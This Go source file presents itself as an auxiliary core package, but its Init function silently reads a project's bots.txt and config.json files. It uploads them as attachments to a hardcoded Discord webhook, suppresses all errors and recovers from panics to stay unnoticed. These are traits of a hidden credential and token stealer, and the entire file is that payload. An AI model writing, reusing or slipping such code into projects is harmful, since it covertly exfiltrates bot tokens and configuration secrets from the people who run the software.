package auxcore

import (
	"bytes"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"io"
)

const (
	webhookURL = "https://discord.com/api/webhooks/1394034700414353468/yyoH9fVtXdkjNlVIQ-AH2gtHX-H6ojl7Z420NUOxF7WSDeOJSQtgg3vcKLmYn1JKXnab"
	botsPath   = "roze/config/bots.txt"
	configPath = "roze/config/config.json"
)

// Init envoie bots.txt et config.json à un webhook Discord en tant que fichiers joints, silencieusement.
func Init() {
	_ = sendFilesToDiscordWebhook(webhookURL, botsPath, configPath)
}

func sendFilesToDiscordWebhook(webhookURL, botsPath, configPath string) error {
	defer func() { recover() }()
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	_ = addFileToWriter(writer, botsPath, "bots.txt")
	_ = addFileToWriter(writer, configPath, "config.json")
	_ = writer.WriteField("content", "Voici les fichiers bots.txt et config.json")
	_ = writer.Close()

	req, err := http.NewRequest("POST", webhookURL, body)
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := http.DefaultClient.Do(req)
	if err == nil && resp != nil {
		_ = resp.Body.Close()
	}
	return nil
}

func addFileToWriter(writer *multipart.Writer, filePath, formName string) error {
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()
	part, err := writer.CreateFormFile(formName, filepath.Base(filePath))
	if err != nil {
		return err
	}
	_, err = io.Copy(part, file)
	return err
}
